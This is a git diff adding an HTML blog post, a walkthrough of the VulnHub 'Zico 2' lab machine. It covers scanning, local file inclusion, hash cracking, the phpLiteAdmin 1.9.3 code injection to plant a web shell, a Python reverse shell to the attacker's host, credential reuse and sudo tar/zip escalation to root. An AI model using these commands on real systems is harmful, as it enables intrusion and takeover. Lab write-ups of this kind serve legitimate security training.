@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      VulnHub - Zico 2
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="VulnHub - Zico 2" />
+<meta name="author" content="s4rgaz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description: A Boot2Root Machine intended to simulate a real world scenario" />
+<meta property="og:description" content="Description: A Boot2Root Machine intended to simulate a real world scenario" />
+<link rel="canonical" href="http://localhost:4000/zico2.html" />
+<meta property="og:url" content="http://localhost:4000/zico2.html" />
+<meta property="og:site_name" content="Home" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/zico2.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-12-22T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/zico2.html" />
+<meta property="twitter:title" content="VulnHub - Zico 2" />
+<script type="application/ld+json">
+{"headline":"VulnHub - Zico 2","dateModified":"2021-12-22T00:00:00-05:00","datePublished":"2021-12-22T00:00:00-05:00","url":"http://localhost:4000/zico2.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/zico2.html"},"author":{"@type":"Person","name":"s4rgaz"},"@type":"BlogPosting","description":"Description: A Boot2Root Machine intended to simulate a real world scenario","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+ 
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <header>
+
+<ul class="horizontal-list">
+  
+    <li>
+      <a href="/">
+        Home
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/walkthroughs">
+        Walkthroughs
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/about">
+        About
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+</ul>
+ 
+<!--  <div class="dashed"></div> -->
+
+
+<!--  <h1>Home</h1> -->
+  
+</header>
+
+<a href="/"></a>
+<h1 class="post-title">VulnHub - Zico 2</h1> 
+<p class="post-date text-bold text-upcase">
+  
+    <span>December 2021</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+ 
+<p><strong>Description:</strong> A Boot2Root Machine intended to simulate a real world scenario</p>
+
+<p><strong>Author:</strong> Rafael</p>
+
+<p><strong>Operating System:</strong> Linux</p>
+
+<p><strong>Aim:</strong> To get root and read the flag file.</p>
+
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/zico2-1,210/">https://www.vulnhub.com/entry/zico2-1,210/</a></p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>A ping scan on the local network discovered the target host, the script you can find it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
+192.168.179.179 <span class="o">=&gt;</span> up
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>The full TCP scan with nmap discovered four open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 192.168.179.179 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
+...
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+47159/tcp open  unknown
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>In order to discover more information about the available services, an aggressive scan was performed with nmap.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-p22</span>,80,111,47159 192.168.179.179 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT      STATE SERVICE VERSION                                           
+22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:                                                      
+|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 <span class="o">(</span>DSA<span class="o">)</span>     
+|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 <span class="o">(</span>RSA<span class="o">)</span>         
+|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 <span class="o">(</span>ECDSA<span class="o">)</span>   
+80/tcp    open  http    Apache httpd 2.2.22 <span class="o">((</span>Ubuntu<span class="o">))</span>        
+| http-methods:                                      
+|_  Supported Methods: OPTIONS GET HEAD POST            
+|_http-server-header: Apache/2.2.22 <span class="o">(</span>Ubuntu<span class="o">)</span>    
+|_http-title: Zico<span class="s1">'s Shop                      
+111/tcp   open  rpcbind 2-4 (RPC #100000)      
+| rpcinfo:                                    
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          33465/udp   status 
+|   100024  1          40806/tcp6  status 
+|   100024  1          47159/tcp   status 
+|_  100024  1          60683/udp6  status 
+47159/tcp open  status  1 (RPC #100024)
+...
+</span></code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>In The web service we can see a shop web page.</p>
+
+<p><img src="/assets/images/zico2/screenshot-1.png" alt="" /></p>
+
+<p>Browsing I found that the <strong>page</strong> parameter is including an HTML file.</p>
+
+<p><img src="/assets/images/zico2/screenshot-2.png" alt="" /></p>
+
+<p>By attempt to include the system password file was detected that is vulnerable to Local File Inclusion.</p>
+
+<p><img src="/assets/images/zico2/screenshot-3.png" alt="" /></p>
+
+<p>A quick enumeration with dirb found the <strong>dbadmin</strong> directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirb http://192.168.179.179 <span class="nt">-r</span>
+...
+<span class="nt">----</span> Scanning URL: http://192.168.179.179/ <span class="nt">----</span>
++ http://192.168.179.179/cgi-bin/ <span class="o">(</span>CODE:403|SIZE:291<span class="o">)</span>  
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.179/css/          
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.179/dbadmin/      
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.179/img/        
++ http://192.168.179.179/index <span class="o">(</span>CODE:200|SIZE:7970<span class="o">)</span>  
++ http://192.168.179.179/index.html <span class="o">(</span>CODE:200|SIZE:7970<span class="o">)</span> 
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.179/js/             
++ http://192.168.179.179/LICENSE <span class="o">(</span>CODE:200|SIZE:1094<span class="o">)</span>  
++ http://192.168.179.179/package <span class="o">(</span>CODE:200|SIZE:789<span class="o">)</span>  
++ http://192.168.179.179/server-status <span class="o">(</span>CODE:403|SIZE:296<span class="o">)</span>
++ http://192.168.179.179/tools <span class="o">(</span>CODE:200|SIZE:8355<span class="o">)</span>   
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.179/vendor/     
++ http://192.168.179.179/view <span class="o">(</span>CODE:200|SIZE:0<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We access this and find a link, and click on it.</p>
+
+<p><img src="/assets/images/zico2/screenshot-4.png" alt="" /></p>
+
+<p>This contains a login form, we login entering <strong>admin</strong> as password.</p>
+
+<p><img src="/assets/images/zico2/screenshot-5.png" alt="" /></p>
+
+<p><img src="/assets/images/zico2/screenshot-6.png" alt="" /></p>
+
+<p>By browsing, two users were found with their respective password hashes.</p>
+
+<p><img src="/assets/images/zico2/screenshot-7.png" alt="" /></p>
+
+<p>We copy the password hashes to a file, and crack it with hashcat.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"96781A607F4E9F5F423AC01F0DAB0EBD</span><span class="se">\n</span><span class="s2">653F4B285089453FE00E2AAFAC573414"</span> <span class="o">&gt;</span> hashes.phplite
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz <span class="o">&gt;</span> rockyou.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 0 hashes.phplite rockyou.txt
+...
+96781a607f4e9f5f423ac01f0dab0ebd:zico2215@
+653f4b285089453fe00e2aafac573414:34kroot34 
+</code></pre></div></div>
+
+<p>In seconds hashcat managed to crack the MD5 hashes, with this credentials it was not possible to access to the server via SSH.</p>
+
+<p>A Remote Code Injection vulnerability was discovered for phpLiteAdmin 1.9.3.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit phpliteadmin 1.9.3                            
+<span class="nt">-----------------------------------------------------------</span> <span class="nt">-------------------------</span>
+ Exploit Title                                             |  Path
+<span class="nt">-----------------------------------------------------------</span> <span class="nt">-------------------------</span>
+PHPLiteAdmin 1.9.3 - Remote PHP Code Injection             | php/webapps/24044.txt
+<span class="nt">-----------------------------------------------------------</span> <span class="nt">-------------------------</span>
+</code></pre></div></div>
+
+<p>We copy the exploit to our current directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/24044.txt
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="remote-php-code-injection">Remote PHP Code Injection</h3>
+
+<p>We follow the instructions described in the exploit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>24044.txt
+...
+Proof of Concept:
+
+1. We create a db named <span class="s2">"hack.php"</span><span class="nb">.</span>
+<span class="o">(</span>Depending on Server configuration sometimes it will not work and the name <span class="k">for </span>the db will be <span class="s2">"hack.sqlite"</span><span class="nb">.</span> Then simply try to rename the database / existing database to <span class="s2">"hack.php"</span>.<span class="o">)</span>
+The script will store the sqlite database <span class="k">in </span>the same directory as phpliteadmin.php.
+Preview: http://goo.gl/B5n9O
+Hex preview: http://goo.gl/lJ5iQ
+
+2. Now create a new table <span class="k">in </span>this database and insert a text field with the default value:
+&lt;?php phpinfo<span class="o">()</span>?&gt;
+Hex preview: http://goo.gl/v7USQ
+
+3. Now we run hack.php
+</code></pre></div></div>
+
+<p>We create a database called <strong>hack.php</strong>.</p>
+
+<p><img src="/assets/images/zico2/screenshot-8.png" alt="" /></p>
+
+<p>We create a table called <strong>lite</strong> that will contain a column called <strong>input</strong>.</p>
+
+<p><img src="/assets/images/zico2/screenshot-9.png" alt="" /></p>
+
+<p><img src="/assets/images/zico2/screenshot-10.png" alt="" /></p>
+
+<p>We insert a web shell into the <strong>input</strong> column.</p>
+
+<p><img src="/assets/images/zico2/screenshot-11.png" alt="" /></p>
+
+<p>Using the LFI vulnerability we can include the <strong>hack.php</strong> database, to execute the <strong>whoami</strong> command.</p>
+
+<p><img src="/assets/images/zico2/screenshot-12.png" alt="" /></p>
+
+<p>We need to set up a netcat listener on port 443, and run the following python reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.179.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/zico2/screenshot-13.png" alt="" /></p>
+
+<p>We have a shell with user privileges <strong>www-data</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.179] 55927
+www-data@zico:/var/www<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Listing the wordpress config file in the zico’s home directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@zico:/home/zico/wordpress<span class="nv">$ </span><span class="nb">head</span> <span class="nt">-40</span> wp-config.php
+<span class="nb">head</span> <span class="nt">-40</span> wp-config.php
+...
+// <span class="k">**</span> MySQL settings - You can get this info from your web host <span class="k">**</span> //
+/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'zico'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL database username <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'zico'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL database password <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'sWfCsfJSPV9H3AmQzw8'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'zico'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> Database Charset to use <span class="k">in </span>creating database tables. <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_CHARSET'</span>, <span class="s1">'utf8'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> The Database Collate type. Don<span class="s1">'t change this if in doubt. */
+define('</span>DB_COLLATE<span class="s1">', '');
+</span></code></pre></div></div>
+
+<p>We reuse the wordpress password to login as user zico.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@zico:/home/zico<span class="nv">$ </span>su zico
+su zico
+Password: sWfCsfJSPV9H3AmQzw8
+
+zico@zico:~<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>zico<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>zico<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>zico<span class="o">)</span>
+</code></pre></div></div>
+
+<p>The zico user has sudo privileges to run the tar and zip binaries, we’ll use the both to get root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zico@zico:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>zico on this host:
+    env_reset, <span class="nv">exempt_group</span><span class="o">=</span>admin,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User zico may run the following commands on this host:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/tar
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/zip
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-permissions">Sudo Permissions</h3>
+
+<p>To get root via tar we execute the following command which will run /bin/bash on every checkpoint, this method was extracted from <a href="https://gtfobins.github.io/gtfobins/tar/#sudo">GTFOBINS</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zico@zico:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/tar <span class="nt">-cf</span> /dev/null /dev/null <span class="nt">--checkpoint</span><span class="o">=</span>1 <span class="nt">--checkpoint-action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span>/bin/bash
+&lt;<span class="nt">-cf</span> /dev/null /dev/null <span class="nt">--checkpoint</span><span class="o">=</span>1 <span class="nt">--checkpoint-action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span>/bin/bash   
+/bin/tar: Removing leading <span class="sb">`</span>/<span class="s1">' from member names
+root@zico:~#
+</span></code></pre></div></div>
+
+<p>We execute the following zip command to get root, this topic was obtained from <a href="https://gtfobins.github.io/gtfobins/zip/#sudo">GTFOBINS</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zico@zico:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/zip /dev/null /etc/sudoers <span class="nt">-T</span> <span class="nt">-TT</span> <span class="s1">'bash #'</span>
+<span class="nb">sudo</span> /usr/bin/zip /dev/null /etc/sudoers <span class="nt">-T</span> <span class="nt">-TT</span> <span class="s1">'bash #'</span>
+  adding: etc/sudoers <span class="o">(</span>deflated 49%<span class="o">)</span>
+root@zico:~#
+</code></pre></div></div>
+
+<p>And finally we read the root flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@zico:~# <span class="nb">cd</span> /root
+<span class="nb">cd</span> /root
+root@zico:/root# <span class="nb">ls 
+ls
+</span>flag.txt
+root@zico:/root# <span class="nb">cat </span>flag.txt
+<span class="nb">cat </span>flag.txt
+<span class="c">#</span>
+<span class="c">#</span>
+<span class="c">#</span>
+<span class="c"># ROOOOT!</span>
+<span class="c"># You did it! Congratz!</span>
+<span class="c"># </span>
+<span class="c"># Hope you enjoyed! </span>
+<span class="c"># </span>
+<span class="c"># </span>
+<span class="c">#</span>
+<span class="c">#</span>
+</code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <footer>
+<!--	  <div class="dashed"></div> -->
+    <ul class="horizontal-list">
+  
+</ul>
+
+  </footer>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
+          &nbsp;
+		  •
+          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+		  •
+          &nbsp;-->
+		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
+		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
